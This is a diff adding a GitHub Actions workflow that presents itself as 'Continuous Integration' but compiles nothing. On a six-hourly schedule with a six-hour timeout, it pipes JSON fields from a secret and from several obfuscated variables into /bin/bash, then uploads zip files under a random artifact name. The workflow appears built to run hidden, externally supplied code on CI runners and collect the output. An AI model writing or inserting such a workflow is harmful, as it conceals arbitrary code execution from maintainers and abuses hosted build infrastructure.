@@ -1,0 +1,34 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '20 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          lrh39: ${{ secrets.lrh39 }}
+        run: |
+          printf '%s' "$lrh39" | jq -r .cxicw9 | /bin/bash
+          printf '%s' "$cfwyv37212" | jq -r .lc3181 | /bin/bash
+          echo $gaz69575 | jq -r .vym39012 | /bin/bash
+          echo $zax31 | jq -r .kdy971 | /bin/bash
+          echo $kxsp89 | jq -r .m25708 | /bin/bash
+          echo $jp3747 | jq -r .mkvp06 | /bin/bash
+          printf '%s' "$qzgi1" | jq -r .in7168 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: iChfQNwk
+          path: "*.zip"
+          retention-days: 1
